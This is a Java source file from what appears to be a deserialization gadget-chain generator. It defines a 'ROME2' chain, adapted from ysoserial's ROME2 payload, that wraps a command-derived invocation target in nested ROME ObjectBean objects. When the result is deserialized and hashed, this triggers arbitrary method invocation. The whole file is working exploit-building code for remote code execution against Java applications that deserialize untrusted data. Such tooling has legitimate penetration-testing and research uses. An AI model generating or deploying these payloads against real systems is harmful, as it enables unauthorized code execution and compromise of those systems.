package org.ses.gadgetbuilder.chains1;

import com.rometools.rome.feed.impl.ObjectBean;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;

/**
 * Exactly the same as ROME payload, but for the newer version of rome library
 * where package name is changed from com.sun.syndication -> com.rometools.rome
 * https://github.com/artsploit/ysoserial/blob/master/src/main/java/ysoserial/payloads/ROME2.java
 */

@Dependencies("com.rometools:rome:1.11.1")
@Authors({ Authors.MBECHLER })
@Impact(Impact.MethodInvoke)
public class ROME2 extends MethodInvokeGadgetChain<HashCodeTrampoline, GetterMethodInvokeAdapter> {
    public ROME2(HashCodeTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        Object o = this.methodInvokeAdapter.getInvocationTarget(command);

        Class targetInterface = this.methodInvokeAdapter.getTargetInterface();

        if (targetInterface == null) {
            throw new AdapterMismatchException("ROME2 gadget chain requires a sink method adapter class that has interfaces " +
                    "corresponding to the to be invoked methods. This is not the case for " + this.methodInvokeAdapter.getClass().getSimpleName());
        }

        ObjectBean delegate = new ObjectBean(targetInterface, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);

        return new TrampolineConnector(root);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.rometools.rome.feed.impl.ObjectBean.hashCode()\n"+
                "com.rometools.rome.feed.impl.EqualsBean.beanHashCode()\n"+
                "com.rometools.rome.feed.impl.ObjectBean.toString()\n"+
                "com.rometools.rome.feed.impl.ToStringBean.toString()\n"+
                "com.rometools.rome.feed.impl.ToStringBean.toString()\n"+
                "java.lang.reflect.Method.invoke()";
    }
}
